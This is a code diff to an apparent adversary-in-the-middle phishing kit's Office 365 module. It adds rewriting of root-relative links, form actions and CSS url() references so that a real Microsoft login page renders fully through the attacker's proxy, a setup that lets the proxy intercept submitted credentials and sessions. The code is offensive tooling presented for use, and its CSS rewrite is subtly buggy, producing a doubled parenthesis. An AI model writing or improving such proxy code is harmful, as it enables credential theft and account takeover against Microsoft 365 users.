@@ -967,6 +967,33 @@ class Office365Module(BaseModule):
                     for old_url, new_url in replacements:
                         content_str = content_str.replace(old_url, new_url)
                     
+                    # NEW: Rewrite **root-relative** references (e.g. src="/foo.js") so that they
+                    # are also routed through the proxy.  Without this, the browser would request
+                    # the resource from our domain root (resulting in 404) instead of from the
+                    # proxied Microsoft domain, which ultimately causes the page to render with
+                    # missing CSS/JS and eventually a blank screen.
+                    root_relative_attrs = [
+                        'src="/', 'href="/', 'action="/', 'formaction="/',
+                        "src='/", "href='/", "action='/", "formaction='/"
+                    ]
+
+                    for patt in root_relative_attrs:
+                        # Example:  src="/polyfills.js"  ->  src="https://{host}/proxy/polyfills.js"
+                        if patt in content_str:
+                            replacement_prefix = patt.replace('/','').split('=')[0] + f'="https://{current_host}/proxy/'
+                            content_str = content_str.replace(patt, replacement_prefix)
+
+                    # Also fix CSS inline url("/path") statements
+                    css_url_prefixes = [
+                        'url("/', "url('/"
+                    ]
+
+                    for css_patt in css_url_prefixes:
+                        if css_patt in content_str:
+                            replacement_css = css_patt.replace('/','')[:4] + f'("https://{current_host}/proxy/'
+                            # The preceding slice ensures we keep 'url(' unchanged while replacing opening quote & slash
+                            content_str = content_str.replace(css_patt, replacement_css)
+
                     content = content_str.encode('utf-8')
                     self.log(f"[AiTM] Serving REAL Microsoft page with MINIMAL URL rewriting only")
                     
